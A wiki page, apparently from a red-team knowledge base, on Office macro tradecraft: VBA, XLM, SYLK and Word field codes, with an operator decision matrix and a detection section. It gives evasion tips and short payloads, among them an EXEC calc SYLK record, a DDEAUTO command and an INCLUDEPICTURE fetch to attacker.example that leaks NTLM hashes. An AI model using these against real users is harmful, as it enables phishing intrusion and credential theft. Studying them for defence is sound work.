---
title: "Office Macro Tradecraft (VBA, XLM, SYLK, Word Fields)"
permalink: /wiki/concepts/office-macro-tradecraft/
layout: single
author_profile: true
tags:
  - phishing
  - initial-access
  - office
  - vba
  - xlm
  - sylk
  - outflank
---

*The four main Office initial-access primitives — VBA macros, Excel 4.0 (XLM) macros, the SYLK file format, Word field codes — and the operator decisions that go into picking one.*

**Status:** drafting
**Related:** [Mark-of-the-Web](/wiki/concepts/mark-of-the-web/), [HTML smuggling](/wiki/concepts/html-smuggling/), [AMSI bypass](/wiki/techniques/amsi-bypass/), [Phishing](/wiki/concepts/phishing/), [VSTO-signed phishing](/wiki/concepts/vsto-phishing/), [Outflank blog catalogue](/wiki/resources/outflank/)

---

## The four primitives

| Primitive | What it is | Why pick it |
|---|---|---|
| VBA macro | The classic. `.docm`, `.xlsm`, `.pptm`. AutoOpen / Document_Open / Workbook_Open hooks. | Most familiar to defenders → most-mitigated, most-detected. Subject to AMSI scanning since Office 2019. |
| Excel 4.0 (XLM) macros | Pre-VBA macro language. `.xlsm` with hidden Macro-1 sheet, or `.xls`. Functions like `EXEC`, `CALL`, `REGISTER`. | Many EDR/AMSI products historically didn't scan XLM as aggressively. Unicode hidden cells, custom function names, `=FORMULA(…)` self-modifying sheets all helped evasion. |
| SYLK | "Symbolic Link" — old Excel/Multiplan flat-text format. `.slk` extension, but Excel opens almost any extension as SYLK if the magic bytes match. Embedded `;E` / `;C` directives can run XLM functions. | No VBA project at all — bypasses VBA-specific blocking. Historically opened without macro warnings on some Office versions. |
| Word field codes | `{ INCLUDEPICTURE … }`, `{ DDEAUTO … }`, `{ INCLUDETEXT … }`. Embedded in `.docx` (no macro project). | DDE was killed in 2017 patches but variants have surfaced periodically. INCLUDEPICTURE → SMB → NTLM hash leak (a creds-leak primitive, not RCE). |

## VBA macros — current state (2026)

After Microsoft's 2022 change, **internet-zoned VBA is blocked by default** with no in-product enable. Operators have largely moved on to:

- **Containers stripping MotW** (pre-Win11 22H2 — see [Mark-of-the-Web](/wiki/concepts/mark-of-the-web/)).
- **Trusted-location side-loading** — rare; requires existing access.
- **VBA stomping** — replace VBA p-code without source so analysts mis-decompile. Outflank's *Evil Clippy* (2019) automated this.
- **Mass corporate trust-list misconfigurations** — domains that the org has explicitly trusted (legacy LOB apps); social-engineer the user via that path.

Once VBA does run:

- **AMSI** scans macro content at parse time. The classic [AMSI bypass for VBA](/wiki/techniques/amsi-bypass/) is patching `AmsiScanBuffer` in-process before the malicious code runs.
- **CreateObject("WScript.Shell").Run(…)**, **Shell32.ShellExecute**, **WMI Win32_Process.Create** — common shell-out primitives.
- **CallByName / Application.Run** indirection avoids string-literal `Shell` AV signatures.

## Excel 4.0 (XLM) — alive past its sell-by

Outflank's 2018 *Old school: evil Excel 4.0 macros (XLM)* re-popularised XLM after years of dormancy. Properties:

- A `.xlsm` can carry an XLM macro sheet (pre-1995 macro engine) instead of, or alongside, VBA.
- `=EXEC("cmd /c …")` runs OS commands. `=CALL("urlmon", "URLDownloadToFileA", …)` chains directly to Win32 APIs.
- Auto-execute via the `Auto_Open` named range.
- Text obfuscation (`=CHAR(110)&CHAR(101)&…`) defeats string-match scanners.
- Cells in hidden / very-hidden sheets, white-on-white text, off-screen positions — all to hide from cursory analyst review.

Microsoft added `XLM Macro` AMSI integration in 2021 (`Excel.exe` calls `AmsiScanString` for XLM cell evaluations), and in 2022 disabled XLM by default in new Excel installs.

## SYLK — the format that no macro warning catches

Outflank's *Abusing the SYLK file format* (2019) and the earlier *SYLK + XLM = Code execution on Office 2011 for Mac* (2018):

- `.slk` files are ASCII; first line is `ID;PFooBar`. Excel opens them when given `.slk`, `.csv` posing as SYLK, or sometimes any text file with the right magic.
- Embedded `;E` directives run XLM-equivalent functions:
  ```
  ID;P
  C;X1;Y1;EEXEC("cmd /c calc")
  ```
- On older Office for Mac, the file opened without prompting at all.
- On modern Windows Office, Protected View handles SYLK like any other macro-bearing file *if* MotW is present. SYLK from a trusted location historically still opened with weaker warnings.

The contemporary value: SYLK can be rebranded with a `.csv` extension and still open in Excel — useful when allow-listing is by extension only.

## Word field codes

`.docx` files (no VBA project) with embedded field codes:

- `{ INCLUDEPICTURE "\\\\attacker.example\\share\\img.jpg" }` — UNC fetch on Open. Outbound SMB → NTLMv2 hash. Pure credential leak primitive.
- `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc" }` — DDE execution. Killed in MS17-014 / patches; variants resurface periodically.
- `{ INCLUDETEXT "URL" }` / `{ HYPERLINK "URL" }` — staging.

Field codes don't trigger VBA / XLM AMSI paths — defenders rely on Office field-blocking GPOs.

## Operator decision matrix

| Target context | Best primitive |
|---|---|
| Modern enterprise, Win11 + Office 365 patched, no trusted internal sources | None native — pivot to LNK / ISO / HTML-smuggling chains. |
| Legacy environment with old Office, partial GPO | XLM in a `.xls`. |
| Macro-blocked but allow-list-by-extension org | SYLK as `.csv`. |
| Standard corp with VBA macros from trusted partners enabled | VBA + AMSI bypass. |
| Pure credential-harvesting (no RCE needed) | Word INCLUDEPICTURE → NTLM relay. |

## Detection

- **AMSI** for VBA and XLM (post-2019 / -2021 respectively).
- **Sysmon Event 1** with parent process Office and unusual child (cmd.exe, mshta.exe, regsvr32.exe).
- **Office macro execution telemetry** via the Office Cloud Policy / Defender for O365 — Outflank's own *Hunting for evil: detect macros being executed* (2018-01-16) is a still-relevant defender writeup.
- **Network egress to non-corporate IPs** from Office processes (UNC fetches, DDE-style execution chains).

## See also

- [HTML smuggling](/wiki/concepts/html-smuggling/) — common delivery wrapper.
- [Mark-of-the-Web](/wiki/concepts/mark-of-the-web/) — the gate every macro file has to clear.
- [AMSI bypass](/wiki/techniques/amsi-bypass/) — VBA-side bypasses.
- [Evil Clippy](/wiki/tools/evil-clippy/) — VBA stomping tool.

## References

- Outflank — *HTML smuggling explained* (2018-08-14).
- Outflank — *Old school: evil Excel 4.0 macros (XLM)* (2018-10-06) — <https://www.outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/>
- Outflank — *Sylk + XLM = Code execution on Office 2011 for Mac* (2018-10-12).
- Outflank — *Abusing the SYLK file format* (2019-10-30).
- Outflank — *MS Word field abuse* (2019-04-02).
- Outflank — *Bypassing AMSI for VBA* (2019-04-17).
- Outflank — *Evil Clippy* (2019-05-05).
- Outflank — *Hunting for evil: detect macros being executed* (2018-01-16).
